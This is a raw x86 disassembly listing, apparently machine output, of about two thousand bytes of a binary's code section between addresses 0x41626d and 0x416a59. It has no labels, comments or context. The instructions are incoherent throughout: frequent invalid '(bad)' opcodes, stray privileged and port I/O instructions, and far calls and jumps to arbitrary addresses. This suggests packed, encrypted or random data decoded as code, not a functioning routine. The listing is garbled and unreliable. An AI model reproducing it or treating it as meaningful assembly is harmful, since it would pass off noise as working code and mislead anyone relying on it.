  41626d:	jbe    0x4162c9
  41626f:	add    al,0xc9
  416271:	xor    eax,0x28677765
  416276:	into   
  416277:	cmp    BYTE PTR [eax+0x4b],0x9b
  41627b:	outs   dx,BYTE PTR ds:[esi]
  41627c:	aad    0xee
  41627e:	sti    
  41627f:	jmp    0x53f6d8
  416284:	int    0x36
  416286:	sbb    dl,BYTE PTR [esi+edx*8-0x22]
  41628a:	jo     0x416220
  41628c:	sub    al,0x40
  41628e:	bound  ebp,QWORD PTR [esi+ebp*1-0x2c151fec]
  416295:	es and eax,0xdc9c5c50
  41629b:	(bad)  
  41629c:	out    0xcc,eax
  41629e:	pop    esi
  41629f:	mov    ch,ch
  4162a1:	leave  
  4162a2:	inc    esp
  4162a3:	ret    0x8932
  4162a6:	les    ebx,FWORD PTR [ebx-0x24a6e235]
  4162ac:	pop    es
  4162ad:	call   0x45f9a9a7
  4162b2:	mov    ch,BYTE PTR [esi+ecx*1-0x779e32ed]
  4162b9:	retf   0xb884
  4162bc:	push   edx
  4162bd:	sbb    cl,0x68
  4162c0:	(bad)  
  4162c1:	out    0xac,al
  4162c3:	pop    eax
  4162c4:	sbb    DWORD PTR [ebp-0x6a],eax
  4162c7:	mov    dl,0xcc
  4162c9:	in     al,0xf2
  4162cb:	mov    dl,0x16
  4162cd:	adc    al,0x59
  4162cf:	fmul   QWORD PTR [eax+0x72]
  4162d2:	mov    edx,0x5b60b780
  4162d7:	jnp    0x4162e1
  4162d9:	sub    DWORD PTR [esp+edi*1+0x2e],edi
  4162dd:	or     bl,BYTE PTR [esi+0x6a]
  4162e0:	cmp    dh,BYTE PTR [eax+ecx*4+0xa]
  4162e4:	and    al,0x18
  4162e6:	into   
  4162e7:	mov    WORD PTR [esi+0x2d],fs
  4162ea:	retf   0xcab4
  4162ed:	dec    esp
  4162ee:	into   
  4162ef:	sub    al,BYTE PTR [eax-0x2bafb956]
  4162f5:	mov    ah,0xa2
  4162f7:	(bad)  
  4162f8:	iret   
  4162f9:	push   edx
  4162fa:	inc    ebp
  4162fb:	push   esp
  4162fd:	adc    al,0x20
  4162ff:	(bad)  
  416300:	mov    eax,ds:0x822638d0
  416305:	inc    ebx
  416306:	test   BYTE PTR [esi-0x7fbb4425],bh
  41630c:	into   
  41630d:	jo     0x41632f
  41630f:	and    bl,BYTE PTR [eax+eax*1-0x49]
  416313:	hlt    
  416314:	es stos BYTE PTR es:[edi],al
  416316:	inc    edx
  416317:	mov    al,ds:0x4e6e59e3
  41631c:	xor    BYTE PTR [edx-0x22],al
  41631f:	(bad)  
  416321:	and    cl,BYTE PTR [edx]
  416323:	inc    BYTE PTR [eax-0x7c]
  416326:	stos   DWORD PTR es:[edi],eax
  416327:	test   BYTE PTR [eax],cl
  416329:	xchg   edi,eax
  41632a:	les    ecx,FWORD PTR [esi-0x25d33f4a]
  416330:	fimul  DWORD PTR [esi+0x72039a1b]
  416336:	shl    BYTE PTR [edx-0x4043a7c6],1
  41633c:	test   eax,0x1d1103b4
  416341:	xchg   esi,eax
  416342:	or     dl,BYTE PTR [edx+ecx*2+0x34]
  416346:	mov    DWORD PTR [ecx-0x75ea5f56],esi
  41634c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41634d:	cli    
  41634e:	test   eax,0xd1a26e42
  416353:	add    DWORD PTR [ebp+0x2a26b4c3],0x6ca606f2
  41635d:	mov    al,ds:0x8667404a
  416362:	sub    BYTE PTR [eax+0x58],0x51
  416366:	jne    0x41639e
  416368:	arpl   si,bx
  41636a:	mov    BYTE PTR [esi-0x32d37176],cl
  416370:	mov    DWORD PTR [eax],ecx
  416372:	cmp    al,0x3
  416374:	sub    al,0xa5
  416376:	int3   
  416377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416378:	add    eax,0x2b9aa8b6
  41637d:	push   eax
  41637e:	xchg   DWORD PTR [ebp+0x22],ebp
  416381:	push   es
  416382:	or     dl,BYTE PTR cs:[eax+0x50]
  416386:	ror    DWORD PTR [esi],1
  416388:	test   ch,dh
  41638a:	mov    BYTE PTR [edx+ecx*8+0x68],ah
  41638e:	cld    
  41638f:	call   0x94699a4e
  416394:	enter  0x3724,0x69
  416398:	or     edx,ebx
  41639a:	fadd   QWORD PTR [ecx]
  41639c:	add    eax,0xd084aad6
  4163a1:	sbb    BYTE PTR [esi+0x10],0xf6
  4163a5:	inc    edx
  4163a6:	inc    ebp
  4163a7:	mov    ds:0x907c4a8e,al
  4163ac:	jb     0x4163c0
  4163ae:	push   eax
  4163af:	mov    esp,0xed85ad0
  4163b4:	lods   al,BYTE PTR ds:[esi]
  4163b5:	in     eax,dx
  4163b6:	jl     0x41635c
  4163b8:	jo     0x4163dd
  4163ba:	xchg   edx,eax
  4163bb:	push   esi
  4163bc:	adc    al,0xa
  4163be:	lock sub al,0x63
  4163c1:	data16 or bl,BYTE PTR ds:0x2c4d70a2
  4163c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163c9:	ds push ss
  4163cb:	xor    ebp,eax
  4163cd:	dec    esi
  4163ce:	inc    ecx
  4163cf:	pop    eax
  4163d0:	aad    0x50
  4163d2:	nop
  4163d3:	jg     0x416397
  4163d5:	adc    BYTE PTR [ebp+eax*8+0x228fb3db],dh
  4163dc:	pop    esi
  4163dd:	into   
  4163de:	cmp    al,0x1
  4163e0:	adc    dh,BYTE PTR [ecx]
  4163e2:	(bad)  
  4163e3:	mov    cs,WORD PTR [eax+0x62a163c2]
  4163e9:	addr16 fcomip st,st(4)
  4163ec:	in     al,0xfa
  4163ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4163ef:	cwde   
  4163f0:	push   0x381bf14d
  4163f5:	out    dx,eax
  4163f6:	(bad)  
  4163f7:	jo     0x416439
  4163f9:	mov    ebp,0x87eff5e
  4163fe:	ins    DWORD PTR es:[edi],dx
  4163ff:	stos   DWORD PTR es:[edi],eax
  416400:	cs ja  0x416419
  416403:	and    BYTE PTR [esi],ch
  416405:	mov    eax,0xd38388b2
  41640a:	mov    bh,0x89
  41640c:	cs retf 
  41640e:	push   edx
  41640f:	adc    bl,BYTE PTR [edi+0x6a]
  416412:	or     bh,BYTE PTR [edx]
  416414:	inc    esp
  416415:	aam    0x7f
  416417:	lods   al,BYTE PTR ds:[esi]
  416418:	ins    BYTE PTR es:[edi],dx
  416419:	fs and al,0x44
  41641c:	push   cs
  41641d:	fistp  DWORD PTR [edx]
  41641f:	mov    edx,0x43ece762
  416424:	hlt    
  416425:	inc    ebp
  416426:	xchg   ebx,eax
  416427:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416428:	neg    al
  41642a:	shl    BYTE PTR [edx+0x33085c86],0x26
  416431:	stc    
  416432:	xchg   edi,eax
  416433:	stos   BYTE PTR es:[edi],al
  416434:	test   eax,0xfdbae1a2
  416439:	mov    esp,0xeed270ce
  41643e:	mov    ds:0x625d0a0a,eax
  416443:	push   eax
  416444:	mov    dh,0x73
  416446:	mov    dl,0x3d
  416448:	pop    ebx
  416449:	aas    
  41644a:	sbb    ecx,0xc6e1bbba
  416450:	mov    bh,0xa2
  416452:	mov    ds:0x682a44c1,al
  416457:	popf   
  416458:	and    al,bl
  41645a:	ds inc esp
  41645c:	mov    ah,0x66
  41645e:	inc    esp
  41645f:	call   0xd813:0x413615fa
  416466:	push   eax
  416467:	aam    0x88
  416469:	adc    cl,dh
  41646b:	jmp    0x416411
  41646d:	jecxz  0x416429
  41646f:	sbb    ah,BYTE PTR [ebx+eax*1-0xd2270c]
  416476:	jmp    0xd685:0x5504c02
  41647d:	mov    dl,0xf4
  41647f:	cmp    bl,cl
  416481:	lods   al,BYTE PTR ds:[esi]
  416482:	out    dx,eax
  416483:	mov    ds:0x125f0588,eax
  416488:	push   es
  416489:	pop    edx
  41648a:	xchg   edx,eax
  41648b:	cld    
  41648c:	dec    esi
  41648d:	adc    al,BYTE PTR es:[ebx]
  416490:	jmp    0xd8a16ccd
  416495:	xchg   ebp,eax
  416496:	stc    
  416497:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416498:	xchg   BYTE PTR [ecx],al
  41649a:	je     0x416489
  41649c:	sub    BYTE PTR [eax+eax*8],ch
  41649f:	add    BYTE PTR [esi+0x620bc6ef],al
  4164a5:	inc    edi
  4164a6:	inc    ebx
  4164a7:	cld    
  4164a8:	sbb    al,BYTE PTR [ebx]
  4164aa:	dec    eax
  4164ab:	in     al,0x28
  4164ad:	inc    eax
  4164ae:	push   ecx
  4164af:	or     BYTE PTR [edx-0x17cdcd5e],0xa0
  4164b6:	lea    esi,[eax+0x5b]
  4164b9:	or     BYTE PTR [ecx+eax*8+0x58],bh
  4164bd:	or     ch,BYTE PTR [edi+0x1626daf7]
  4164c3:	push   esp
  4164c4:	adc    al,0x39
  4164c6:	(bad)
  4164ca:	cs ss out dx,al
  4164cd:	or     al,BYTE PTR [edx+0x78161782]
  4164d3:	pop    ebx
  4164d4:	jl     0x416554
  4164d6:	cmp    al,0x72
  4164d8:	adc    al,0xb5
  4164da:	es loopne 0x41647d
  4164dd:	add    BYTE PTR [edi+0x72],bl
  4164e0:	add    eax,0xeb926bbe
  4164e5:	mov    ebx,0xc14683e
  4164ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4164eb:	mov    BYTE PTR [eax+edi*8],dl
  4164ee:	mov    eax,ds:0x4fd9566e
  4164f3:	or     esi,ecx
  4164f5:	inc    ebx
  4164f6:	popf   
  4164f7:	push   0x48
  4164f9:	fdiv   st,st(5)
  4164fb:	cmp    eax,0x5a92b443
  416500:	add    al,0x54
  416502:	popa   
  416503:	fdivr  DWORD PTR [ebp+ebx*8+0xd24a64]
  41650a:	jno    0x416522
  41650c:	fidiv  DWORD PTR [ecx]
  41650e:	add    al,bh
  416510:	inc    eax
  416511:	fidiv  DWORD PTR [esi+0x5459c08b]
  416517:	push   esp
  416518:	cmp    BYTE PTR [ebp+0x58],0x86
  41651c:	add    eax,0x15ec5d45
  416521:	ret    0xa8d1
  416524:	call   0x80ae:0x1a92ce4c
  41652b:	dec    eax
  41652c:	(bad)  
  41652d:	repnz cwde 
  41652f:	jne    0x41658b
  416531:	mov    al,ds:0x14f225d8
  416536:	add    DWORD PTR [ecx+0x16],0x54
  41653a:	pop    ecx
  41653b:	or     eax,DWORD PTR [ebx+0x45]
  41653e:	loope  0x416581
  416540:	bound  edi,QWORD PTR ds:0xa00682cc
  416546:	mov    eax,ds:0xdee6c648
  41654b:	jl     0x416543
  41654d:	pop    edx
  41654e:	mov    edi,0x5a1d4d80
  416553:	fnstenv [esi-0x9]
  416556:	fwait
  416557:	or     cl,BYTE PTR [ecx]
  416559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41655a:	adc    eax,0xc45b789b
  41655f:	cmp    dh,BYTE PTR [edi-0x36]
  416562:	or     DWORD PTR [esp+esi*1],edx
  416565:	sub    al,0x3c
  416568:	ins    BYTE PTR es:[edi],dx
  416569:	nop
  41656a:	test   eax,0x1ea2a6a9
  41656f:	in     eax,dx
  416570:	mov    al,ds:0x76b47913
  416575:	xor    eax,0x4ae83415
  41657a:	int3   
  41657b:	mov    ah,BYTE PTR [eax-0x3e9c3d3f]
  416581:	js     0x4165a5
  416583:	jbe    0x41658e
  416585:	xchg   esi,eax
  416586:	xor    ah,BYTE PTR [edx]
  416588:	mov    cs,WORD PTR [edx]
  41658a:	xlat   BYTE PTR ds:[ebx]
  41658b:	and    al,0xda
  41658d:	(bad)  
  41658f:	dec    bl
  416591:	add    bl,BYTE PTR [edx-0x7683ab0f]
  416597:	test   DWORD PTR [ecx],edx
  416599:	lea    ecx,[edi]
  41659b:	jbe    0x4165a7
  41659d:	sub    edi,DWORD PTR [esi+0x35]
  4165a0:	sbb    BYTE PTR [eax+0x1],bh
  4165a3:	scas   al,BYTE PTR es:[edi]
  4165a4:	loopne 0x416562
  4165a6:	add    ah,bl
  4165a8:	xchg   ch,dl
  4165aa:	rol    BYTE PTR [edx+edx*1+0x31888e9a],1
  4165b1:	adc    BYTE PTR es:[eax+0x21],0xe8
  4165b6:	add    cl,dl
  4165b8:	repnz lods al,BYTE PTR es:[esi]
  4165bb:	and    DWORD PTR [esi-0x5e],ecx
  4165be:	aaa    
  4165bf:	pop    eax
  4165c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4165c1:	xchg   esi,eax
  4165c2:	ror    DWORD PTR [edx],cl
  4165c4:	je     0x4165f2
  4165c6:	jp     0x4165c8
  4165c8:	nop
  4165c9:	mov    esp,0xd55815b0
  4165ce:	das    
  4165cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165d0:	xor    BYTE PTR [edx],bh
  4165d2:	xchg   esp,eax
  4165d3:	ins    BYTE PTR es:[edi],dx
  4165d4:	je     0x4165e0
  4165d6:	xor    DWORD PTR [ebp-0x7e],esp
  4165d9:	adc    bh,BYTE PTR [edx+eax*1-0x24]
  4165dd:	cdq    
  4165de:	hlt    
  4165df:	mov    edx,0xbc003e9b
  4165e4:	test   BYTE PTR [edx+0x0],dh
  4165e7:	inc    esi
  4165e8:	outs   dx,BYTE PTR ds:[esi]
  4165e9:	push   es
  4165ea:	add    esi,DWORD PTR [esi-0x3b]
  4165ed:	ins    DWORD PTR es:[edi],dx
  4165ee:	ret    
  4165ef:	jle    0x4165bc
  4165f1:	push   0x380e245e
  4165f6:	inc    esp
  4165f7:	inc    esi
  4165f8:	add    eax,0xc244c2ad
  4165fd:	pop    eax
  4165fe:	mov    bl,0xb2
  416600:	mov    ebp,0x92ee8942
  416605:	mov    DWORD PTR [eax+eax*1],eax
  416608:	inc    edx
  416609:	inc    esi
  41660a:	cwde   
  41660b:	sbb    DWORD PTR [eax],eax
  41660d:	shl    DWORD PTR [eax+0x20],cl
  416610:	pusha  
  416611:	add    DWORD PTR [eax],ebp
  416613:	jbe    0x41668b
  416615:	sbb    ah,dl
  416617:	or     DWORD PTR [eax+0x64],ebx
  41661a:	xchg   BYTE PTR [ebx-0x40eb6f4a],bl
  416620:	sub    al,0x6c
  416622:	mov    dh,0x6a
  416624:	out    0xe5,al
  416626:	dec    esp
  416627:	fs loope 0x416680
  41662a:	cli    
  41662b:	jno    0x416676
  41662d:	int    0xac
  41662f:	dec    ebx
  416630:	adc    ebp,DWORD PTR [edx]
  416632:	fist   WORD PTR [edx+0x6899b276]
  416638:	push   0x68
  41663a:	push   edx
  41663b:	xor    DWORD PTR [esi-0x5541a77a],eax
  416641:	fimul  DWORD PTR [edi]
  416643:	mov    al,ds:0xf1f856e6
  416648:	data16 or dl,dh
  41664b:	mov    cl,BYTE PTR [esi]
  41664d:	mov    dl,0x6e
  41664f:	mov    eax,ds:0x43c2ec0
  416654:	pop    esi
  416655:	pop    ds
  416656:	mov    al,ds:0x28ec241e
  41665b:	sub    al,0x23
  41665d:	cld    
  41665e:	mov    al,ds:0x681f646
  416663:	fisttp DWORD PTR [esp+esi*1+0x74]
  416667:	adc    BYTE PTR [eax-0x5f794754],al
  41666d:	loope  0x416641
  41666f:	shl    ch,0x77
  416672:	repnz add eax,0xc4c9aad4
  416678:	xor    eax,0x4026d2b4
  41667d:	inc    esp
  41667e:	nop
  41667f:	xlat   BYTE PTR ds:[ebx]
  416680:	push   ss
  416681:	pop    esi
  416682:	mov    ds:0x88ecfe9e,eax
  416687:	std    
  416688:	mov    ah,0xe5
  41668a:	sub    ch,BYTE PTR [ebx+ebp*2+0x4d]
  41668e:	mov    BYTE PTR [edx+0x3a],dl
  416691:	add    DWORD PTR [edx-0x58ff45f],eax
  416697:	xor    BYTE PTR ds:0xd8a6a15b,dh
  41669d:	retf   0x4b9d
  4166a0:	out    dx,al
  4166a1:	sbb    cl,0xa8
  4166a4:	dec    ecx
  4166a5:	push   eax
  4166a6:	add    DWORD PTR [esi+0x60],ebp
  4166a9:	or     al,0x46
  4166ab:	call   0xa9f32a51
  4166b0:	adc    al,0xa3
  4166b2:	mov    es,WORD PTR [esi]
  4166b4:	and    eax,0xa0d43054
  4166b9:	mov    al,ds:0x2ec2b1c3
  4166be:	push   ecx
  4166bf:	and    al,0x66
  4166c1:	into   
  4166c2:	ins    BYTE PTR es:[edi],dx
  4166c3:	dec    edx
  4166c4:	mov    ah,0xa
  4166c6:	test   al,0xa8
  4166c8:	cmp    al,0xb3
  4166ca:	ret    0xd4e1
  4166cd:	xchg   ebp,eax
  4166ce:	sbb    al,0x41
  4166d0:	loope  0x41672a
  4166d2:	ret    0x7063
  4166d5:	(bad)  
  4166d7:	mov    esi,0x4ab08696
  4166dc:	sub    BYTE PTR [edx-0x55c4a76a],ch
  4166e2:	sub    BYTE PTR [edx-0x3fd1fdd0],dh
  4166e8:	jbe    0x41669a
  4166ea:	(bad)
  4166ed:	push   0xb0d4c2e2
  4166f2:	sbb    al,BYTE PTR [eax]
  4166f4:	sahf   
  4166f5:	lea    eax,[eax]
  4166f7:	das    
  4166f8:	and    DWORD PTR [esi-0x4aeb89ae],edx
  4166fe:	add    dh,BYTE PTR [eax]
  416700:	jg     0x41668a
  416702:	ret    
  416703:	clc    
  416704:	or     BYTE PTR [edx-0x1b34d3a0],0x38
  41670b:	and    BYTE PTR [esi-0x1f],ah
  41670e:	and    al,0x7e
  416710:	mov    edi,cs
  416712:	aam    0x7
  416714:	test   al,0xce
  416716:	enter  0xd282,0x6f
  41671a:	pop    edx
  41671b:	xor    eax,0xc860389
  416720:	cmp    BYTE PTR [ebx+esi*1-0x64ff5cb5],ch
  416727:	cmp    al,dh
  416729:	mov    ds:0xa23a5e7c,eax
  41672e:	mov    al,BYTE PTR [edx]
  416730:	ret    
  416731:	stc    
  416732:	cmp    eax,0xa6bc6656
  416737:	fcom   DWORD PTR [edx-0x32efe1ff]
  41673d:	test   eax,0xf030db16
  416742:	imul   edx,DWORD PTR [edx-0x36],0xe2355404
  416749:	push   ebp
  41674a:	ficom  WORD PTR [edx+0x18]
  41674d:	mov    ds:0x30a1a8aa,al
  416752:	xor    BYTE PTR [edi+eiz*4-0x62],al
  416756:	xor    al,0x90
  416758:	pop    ecx
  416759:	test   BYTE PTR [edx+0x15],ch
  41675c:	mov    dh,0x64
  41675e:	mov    ds,WORD PTR [ebx-0x72]
  416761:	push   ss
  416762:	jmp    0x416716
  416764:	in     al,0x58
  416766:	mov    ebx,0xd62a0a1a
  41676b:	stos   DWORD PTR es:[edi],eax
  41676c:	ins    BYTE PTR es:[edi],dx
  41676d:	cmp    edi,eax
  41676f:	clc    
  416770:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416771:	inc    edx
  416772:	adc    dl,ah
  416774:	rcr    eax,cl
  416776:	popa   
  416777:	inc    esi
  416778:	dec    eax
  416779:	data16 jb 0x4167b8
  41677c:	aam    0xc8
  41677e:	aam    0x68
  416780:	mov    al,ds:0x993cbab8
  416785:	or     dl,BYTE PTR [eax+0x20e98144]
  41678b:	leave  
  41678c:	push   0x54
  41678e:	sbb    al,0x6b
  416790:	adc    ebx,0xffffff82
  416793:	mov    ds:0x3ef5c260,al
  416798:	shl    DWORD PTR [ecx+0x7d4e0978],1
  41679e:	add    edx,eax
  4167a0:	push   ds
  4167a1:	mov    al,BYTE PTR [esi-0x7dab5cfa]
  4167a7:	frstor [esp+esi*2]
  4167aa:	and    edx,DWORD PTR [eax-0x10]
  4167ad:	dec    ecx
  4167ae:	pop    ebp
  4167af:	fst    DWORD PTR [esi+eiz*8]
  4167b2:	and    cl,BYTE PTR [eax-0x5f]
  4167b5:	jb     0x41674c
  4167b7:	and    dl,BYTE PTR [ebx]
  4167b9:	push   eax
  4167ba:	push   eax
  4167bb:	int3   
  4167bc:	lods   eax,DWORD PTR ds:[esi]
  4167bd:	pushf  
  4167be:	js     0x416774
  4167c0:	ds jecxz 0x4167d6
  4167c3:	(bad)  
  4167c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167c5:	pop    ebx
  4167c6:	mov    dl,0xf9
  4167c8:	ret    0x9bbe
  4167cb:	dec    ecx
  4167cc:	loopne 0x416803
  4167ce:	mov    ah,0x54
  4167d0:	ins    BYTE PTR es:[edi],dx
  4167d1:	int    0xbc
  4167d3:	sbb    ah,ah
  4167d5:	fsub   DWORD PTR [eax+0x3967058]
  4167db:	xchg   esi,eax
  4167dc:	retf   
  4167dd:	xor    BYTE PTR [esi],dl
  4167df:	loopne 0x4167ae
  4167e1:	jo     0x416834
  4167e3:	pusha  
  4167e4:	fbld   TBYTE PTR [esp+eax*1+0xb5e2ac]
  4167eb:	dec    ecx
  4167ec:	xchg   edx,eax
  4167ed:	call   0x50b0:0x2517b49c
  4167f4:	mov    al,ds:0x3594e656
  4167f9:	std    
  4167fa:	ret    
  4167fb:	inc    edx
  4167fc:	or     BYTE PTR [eax],ah
  4167fe:	mov    dl,0x84
  416800:	add    BYTE PTR ds:0x29143fd6,ah
  416806:	gs push esp
  416808:	xor    bl,ch
  41680a:	lods   al,BYTE PTR ds:[esi]
  41680b:	mov    al,0x74
  41680d:	push   esi
  41680e:	cmp    al,0x92
  416810:	fsubr  DWORD PTR [esi+0x30]
  416813:	sbb    ch,ah
  416815:	inc    eax
  416816:	out    dx,al
  416817:	in     al,0x51
  416819:	inc    ecx
  41681a:	mov    ebx,0x64c47696
  41681f:	les    ebx,FWORD PTR [eax]
  416821:	pop    ss
  416822:	xchg   edx,eax
  416823:	popa   
  416824:	inc    ecx
  416825:	inc    ebx
  416826:	jnp    0x4167d7
  416828:	jns    0x41682a
  41682a:	or     eax,0x1edadd8e
  41682f:	(bad)  
  416830:	mov    ebx,0xda84b894
  416835:	pmaxsw mm7,QWORD PTR [ecx-0x6964bf06]
  41683c:	adc    eax,DWORD PTR [ebx+0x60]
  41683f:	push   ebx
  416840:	adc    DWORD PTR [edx+eiz*8],eax
  416843:	inc    eax
  416844:	fst    DWORD PTR [esp+eax*4+0x17]
  416848:	jbe    0x416893
  41684a:	and    BYTE PTR [edx],al
  41684c:	fimul  DWORD PTR [eax-0x70]
  41684f:	mov    eax,DWORD PTR [edx+0x33]
  416852:	loop   0x41685c
  416854:	sbb    dl,BYTE PTR [eax-0x30]
  416857:	aam    0x94
  416859:	jle    0x41687d
  41685b:	dec    ebp
  41685c:	call   0xe136fe9b
  416861:	xchg   edx,eax
  416862:	inc    esp
  416863:	and    edi,esi
  416865:	loop   0x4168a1
  416867:	and    eax,0xa68ec2d7
  41686c:	shr    ch,0x54
  41686f:	test   al,0xfe
  416871:	cmc    
  416872:	out    0xea,al
  416874:	imul   esp,ebx,0xffffffb3
  416877:	sub    esi,0x9ca5f280
  41687d:	lahf   
  41687e:	ret    0x94a
  416881:	test   al,0x66
  416883:	mov    al,0x50
  416885:	push   edx
  416886:	dec    esp
  416887:	pop    ebx
  416888:	mov    bl,0xaa
  41688a:	cwde   
  41688b:	lock gs dec esp
  41688e:	or     ah,BYTE PTR [ebx]
  416890:	mov    eax,0x87a65952
  416895:	push   eax
  416896:	inc    edx
  416897:	add    DWORD PTR [esi],ebp
  416899:	cmp    al,0x32
  41689b:	ss sbb al,0x20
  41689e:	mov    WORD PTR [esi-0x64],ss
  4168a1:	sbb    al,0x10
  4168a3:	pusha  
  4168a4:	cmp    ebx,edx
  4168a6:	sbb    edi,DWORD PTR [eax]
  4168a8:	mov    BYTE PTR [edx+0x0],cl
  4168ab:	pop    edx
  4168ac:	inc    eax
  4168ad:	sub    BYTE PTR [esi+0x3b],ah
  4168b0:	int    0x70
  4168b2:	ins    BYTE PTR es:[edi],dx
  4168b3:	sub    BYTE PTR [eax],ah
  4168b5:	pop    ebx
  4168b6:	fcomp  DWORD PTR ds:0x6aaa46bb
  4168bc:	jp     0x41683e
  4168be:	shr    esi,1
  4168c0:	(bad)  
  4168c1:	push   eax
  4168c2:	aas    
  4168c3:	(bad)  
  4168c4:	xchg   ebx,eax
  4168c5:	pusha  
  4168c6:	inc    ebp
  4168c7:	xchg   ebx,eax
  4168c8:	fwait
  4168c9:	sub    al,0xe8
  4168cb:	jg     0x4168d1
  4168cd:	test   al,0xd4
  4168cf:	push   eax
  4168d0:	pop    ebx
  4168d1:	icebp  
  4168d2:	inc    esp
  4168d3:	sbb    BYTE PTR [esi+0x40],0x48
  4168d7:	jb     0x41688b
  4168d9:	cdq    
  4168da:	scas   al,BYTE PTR es:[edi]
  4168db:	test   al,0xd
  4168dd:	push   edi
  4168de:	hlt    
  4168df:	int    0x86
  4168e1:	ja     0x416944
  4168e3:	sbb    dh,BYTE PTR [edx-0x79]
  4168e6:	push   esp
  4168e7:	rcl    esi,1
  4168e9:	push   0xffffffa2
  4168eb:	inc    esi
  4168ec:	sub    DWORD PTR [eax+0x3b7e911a],0xa2a08f02
  4168f6:	push   0x798ae908
  4168fb:	fcmovbe st,st(6)
  4168fd:	push   0x43424bb4
  416902:	adc    BYTE PTR [edi+0x68],bh
  416905:	fld    DWORD PTR [ecx+eiz*1]
  416908:	mov    BYTE PTR [esi],ch
  41690a:	or     ebx,DWORD PTR [eax+ecx*8]
  41690d:	cmp    al,ch
  41690f:	es or  al,0xd6
  416912:	enter  0xea72,0xb1
  416916:	or     BYTE PTR [esp+edi*1],dh
  416919:	push   ebx
  41691a:	xchg   BYTE PTR [eax],bl
  41691c:	sbb    cl,dh
  41691e:	sub    al,0xba
  416920:	mov    dl,0x1a
  416922:	test   al,0x1
  416924:	call   0x1bd0377d
  416929:	shr    DWORD PTR [esi+0x62],0x1
  41692d:	add    BYTE PTR [edx+0x23],al
  416930:	call   0x4c367a53
  416935:	inc    edx
  416936:	or     ebp,DWORD PTR [eax+ebp*4-0x27]
  41693a:	or     bl,dh
  41693c:	lock dec ecx
  41693e:	jecxz  0x416952
  416940:	jb     0x4168fe
  416942:	adc    DWORD PTR [eax+0xe00662b],ebx
  416948:	cli    
  416949:	add    eax,0x6cbe6aac
  41694e:	ss inc edx
  416950:	or     al,bl
  416952:	int3   
  416953:	push   eax
  416954:	aad    0x50
  416956:	pusha  
  416957:	jl     0x4169b9
  416959:	and    al,BYTE PTR [esi-0x3c7827e2]
  41695f:	fcom   st(0)
  416961:	push   eax
  416962:	lock retf 0x4556
  416966:	xchg   BYTE PTR ds:0x4c89ad46,bl
  41696c:	sbb    al,0x4e
  41696e:	xor    eax,0x8e492e54
  416973:	dec    edx
  416974:	(bad)  [eax-0x61]
  416977:	mov    ebx,ds
  416979:	jmp    0x8337:0xe0a6f7fc
  416980:	or     bl,BYTE PTR ds:0xf0512ea3
  416986:	push   eax
  416987:	push   esi
  416988:	mov    esp,0x2bd2ba9e
  41698d:	call   0xc1e57744
  416992:	sbb    BYTE PTR [edx],cl
  416994:	(bad)  
  416996:	sub    al,ch
  416998:	hlt    
  416999:	xor    al,bl
  41699b:	imul   ebp,DWORD PTR [eax+0x53],0xffffff8d
  41699f:	sbb    bh,BYTE PTR [ecx+0x13]
  4169a2:	push   esi
  4169a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4169a4:	xchg   DWORD PTR [ebp-0x3d],esi
  4169a7:	and    BYTE PTR [edx-0x2c],ch
  4169aa:	out    dx,al
  4169ab:	push   ebx
  4169ac:	cmp    al,BYTE PTR [edx+0xa]
  4169af:	add    eax,0x779d6ad0
  4169b4:	jns    0x41696e
  4169b6:	xor    ah,al
  4169b8:	iret   
  4169b9:	and    al,0x2a
  4169bb:	lods   eax,DWORD PTR ds:[esi]
  4169bc:	xchg   ecx,eax
  4169bd:	in     al,0x6
  4169bf:	mov    dl,0xa4
  4169c1:	sub    BYTE PTR [eax+0x32e20a],dh
  4169c7:	imul   BYTE PTR [eax]
  4169c9:	out    0x34,eax
  4169cb:	cmp    al,0x89
  4169cd:	mov    ch,0xb9
  4169cf:	stos   DWORD PTR es:[edi],eax
  4169d0:	cwde   
  4169d1:	imul   BYTE PTR [eax]
  4169d3:	fimul  DWORD PTR [esi-0xc7ab300]
  4169d9:	mov    al,ds:0x14c0ade0
  4169de:	fmulp  st(6),st
  4169e0:	pop    eax
  4169e1:	jl     0x416a47
  4169e3:	add    dh,dl
  4169e5:	dec    esi
  4169e6:	cdq    
  4169e7:	leavew 
  4169e9:	and    DWORD PTR [eax-0x556773b8],esp
  4169ef:	inc    ebp
  4169f0:	adc    ebx,DWORD PTR [eax+0x68]
  4169f3:	cmp    BYTE PTR [esi+eiz*8],0xee
  4169f7:	xchg   sp,ax
  4169f9:	imul   BYTE PTR [ebp+0x60]
  4169fc:	inc    ecx
  4169fd:	nop
  4169fe:	pushf  
  4169ff:	addr16 popa 
  416a01:	int3   
  416a02:	push   0xc0f80022
  416a07:	mov    al,ah
  416a09:	hlt    
  416a0a:	mov    dh,0x4a
  416a0c:	inc    esi
  416a0d:	push   eax
  416a0e:	rcl    BYTE PTR [edx+ebp*2+0x3aa60452],1
  416a15:	jp     0x4169db
  416a17:	sbb    ebp,DWORD PTR ds:0x1ad6813a
  416a1d:	xor    eax,0xe15aedfa
  416a22:	add    eax,0x11c17c24
  416a27:	mov    BYTE PTR [edi-0x70],dh
  416a2a:	and    DWORD PTR [esi+ebp*8],0xef7d0076
  416a31:	mov    DWORD PTR [edi+0x549cd0a6],edx
  416a37:	fist   WORD PTR ss:[edi-0x3e]
  416a3b:	inc    edx
  416a3c:	pusha  
  416a3d:	rcl    BYTE PTR [edi+ecx*8-0x27],0x88
  416a42:	aaa    
  416a43:	push   ecx
  416a44:	push   ebp
  416a45:	mov    bl,0x55
  416a47:	push   es
  416a48:	mov    ds:0xf770163e,al
  416a4d:	ror    bl,0xda
  416a50:	shl    BYTE PTR [ebp-0x781b9ce3],0x1c
  416a57:	test   BYTE PTR [edx],ah
  416a59:	fsubr  QWORD PTR [ebx+0x5040a18c]
